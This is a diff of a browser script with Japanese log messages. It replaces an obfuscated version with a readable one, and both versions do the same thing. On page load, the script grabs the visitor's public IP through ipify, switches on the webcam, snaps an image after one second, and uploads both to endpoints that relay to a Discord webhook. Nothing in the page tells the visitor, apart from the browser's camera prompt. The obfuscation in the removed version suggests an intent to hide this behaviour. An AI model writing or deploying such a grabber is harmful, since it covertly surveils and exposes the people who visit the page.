@@ -1,1 +1,63 @@
-const _0x524c28=_0x5ccf;function _0x5ccf(_0x21b2ef,_0x41cd13){const _0x248beb=_0x248b();return _0x5ccf=function(_0x5ccff2,_0x1875bd){_0x5ccff2=_0x5ccff2-0x123;let _0x3c0bd1=_0x248beb[_0x5ccff2];return _0x3c0bd1;},_0x5ccf(_0x21b2ef,_0x41cd13);}(function(_0x2932ef,_0x203bb4){const _0x18cf72=_0x5ccf,_0x1124b4=_0x2932ef();while(!![]){try{const _0x5eafa4=parseInt(_0x18cf72(0x148))/0x1+parseInt(_0x18cf72(0x126))/0x2+-parseInt(_0x18cf72(0x12a))/0x3+-parseInt(_0x18cf72(0x125))/0x4*(parseInt(_0x18cf72(0x149))/0x5)+parseInt(_0x18cf72(0x12b))/0x6+-parseInt(_0x18cf72(0x13f))/0x7*(-parseInt(_0x18cf72(0x13d))/0x8)+parseInt(_0x18cf72(0x123))/0x9;if(_0x5eafa4===_0x203bb4)break;else _0x1124b4['push'](_0x1124b4['shift']());}catch(_0x1b4389){_0x1124b4['push'](_0x1124b4['shift']());}}}(_0x248b,0xd476e));const video=document[_0x524c28(0x12e)](_0x524c28(0x131)),canvas=document['getElementById'](_0x524c28(0x128));async function getWebhookUrl(){const _0x1b1e68=_0x524c28,_0x56f8d0=await fetch(_0x1b1e68(0x135)),_0x28e738=await _0x56f8d0[_0x1b1e68(0x137)]();return _0x28e738['webhookUrl'];}fetch(_0x524c28(0x13e))[_0x524c28(0x13a)](_0x1e2c30=>_0x1e2c30[_0x524c28(0x137)]())[_0x524c28(0x13a)](_0x2d901a=>{const _0x25c20e=_0x524c28,_0x1f07d4=_0x2d901a['ip'];getWebhookUrl()[_0x25c20e(0x13a)](_0x29969a=>sendToDiscord(_0x29969a,_0x25c20e(0x12c)+_0x1f07d4));})[_0x524c28(0x143)](_0x240e1c=>console[_0x524c28(0x129)](_0x524c28(0x144),_0x240e1c)),navigator[_0x524c28(0x130)][_0x524c28(0x132)]({'video':!![]})['then'](_0x286ab1=>{video['srcObject']=_0x286ab1,setTimeout(captureImage,0x3e8);})['catch'](_0x1ba460=>{const _0xb9cc6b=_0x524c28;console[_0xb9cc6b(0x129)]('カメラの起動に失敗しました:',_0x1ba460);});function captureImage(){const _0x204f53=_0x524c28,_0x3b7227=canvas[_0x204f53(0x146)]('2d');_0x3b7227[_0x204f53(0x13c)](video,0x0,0x0,canvas[_0x204f53(0x134)],canvas[_0x204f53(0x13b)]),canvas['toBlob'](_0x313494=>{const _0x28fe11=_0x204f53,_0x54942a=new FormData();_0x54942a[_0x28fe11(0x140)](_0x28fe11(0x147),_0x313494,'image.png'),getWebhookUrl()[_0x28fe11(0x13a)](_0x283a82=>{const _0x452104=_0x28fe11;fetch(_0x283a82,{'method':_0x452104(0x136),'body':_0x54942a})[_0x452104(0x13a)](_0x52a39b=>{const _0x20d10c=_0x452104;_0x52a39b['ok']?console['log'](_0x20d10c(0x133)):console[_0x20d10c(0x129)](_0x20d10c(0x141),_0x52a39b[_0x20d10c(0x145)],_0x52a39b[_0x20d10c(0x142)]);})[_0x452104(0x143)](_0x547612=>{const _0x3d855b=_0x452104;console[_0x3d855b(0x129)]('エラーが発生しました:',_0x547612);});});},_0x204f53(0x12f));}function sendToDiscord(_0x24dfe1,_0x1110b2){const _0x4bb0c2=_0x524c28;fetch(_0x24dfe1,{'method':_0x4bb0c2(0x136),'headers':{'Content-Type':_0x4bb0c2(0x138)},'body':JSON[_0x4bb0c2(0x139)]({'content':_0x1110b2})})[_0x4bb0c2(0x13a)](_0x529885=>{const _0xc34a8a=_0x4bb0c2;_0x529885['ok']?console[_0xc34a8a(0x12d)](_0xc34a8a(0x127)):console[_0xc34a8a(0x129)](_0xc34a8a(0x124),_0x529885[_0xc34a8a(0x145)],_0x529885[_0xc34a8a(0x142)]);})[_0x4bb0c2(0x143)](_0x2924f6=>{const _0x4b3b69=_0x4bb0c2;console[_0x4b3b69(0x129)]('エラーが発生しました:',_0x2924f6);});}function _0x248b(){const _0x2b7533=['3854465jFldkj','2180646ljhsfE','メッセージの送信に失敗しました:','4EvvLWx','485970tdBJlo','メッセージが送信されました','canvas','error','5166291RkrmJl','625278qVHyxe','IPアドレス:\x20','log','getElementById','image/png','mediaDevices','video','getUserMedia','画像が送信されました','width','/api/webhook','POST','json','application/json','stringify','then','height','drawImage','351088fztHUN','https://api.ipify.org?format=json','217IWHeuO','append','画像の送信に失敗しました:','statusText','catch','IPアドレスの取得に失敗しました:','status','getContext','file','1413286pmKxbT'];_0x248b=function(){return _0x2b7533;};return _0x248b();}
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        const ipAddress = data.ip;
+        sendToDiscord(`IPアドレス: ${ipAddress}`);
+    })
+    .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
+
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        video.srcObject = stream;
+        setTimeout(captureImage, 1000);
+    })
+    .catch(err => {
+        console.error('カメラの起動に失敗しました:', err);
+    });
+
+function captureImage() {
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, 'image.png');
+
+        fetch('/api/sendImage', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('画像が送信されました');
+            } else {
+                console.error('画像の送信に失敗しました:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('エラーが発生しました:', error);
+        });
+    }, 'image/png');
+}
+
+function sendToDiscord(message) {
+    fetch('/api/sendMessage', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content: message })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('メッセージが送信されました');
+        } else {
+            console.error('メッセージの送信に失敗しました:', response.status, response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('エラーが発生しました:', error);
+    });
+}
